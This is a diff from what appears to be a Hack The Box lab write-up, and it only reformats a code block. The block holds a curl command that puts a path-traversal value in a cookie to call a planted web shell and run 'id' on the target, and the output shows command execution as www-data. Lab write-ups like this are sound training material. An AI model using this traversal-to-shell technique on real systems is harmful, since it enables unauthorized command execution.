@@ -247,10 +247,12 @@ drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
 
 ```
 
- `curl -k https://bin.kobold.htb/ \`                    
-  `-b "template=../data/bd/b5/shell" \`
-  `-G --data-urlencode "cmd=id"`
-`uid=65534(nobody) gid=82(www-data) groups=82(www-data)`
+```
+ curl -k https://bin.kobold.htb/ \                    
+  -b "template=../data/bd/b5/shell" \
+  -G --data-urlencode "cmd=id"
+uid=65534(nobody) gid=82(www-data) groups=82(www-data)
+```
 
 ```
 ┌──(kali㉿kali)-[~/htb-academy]
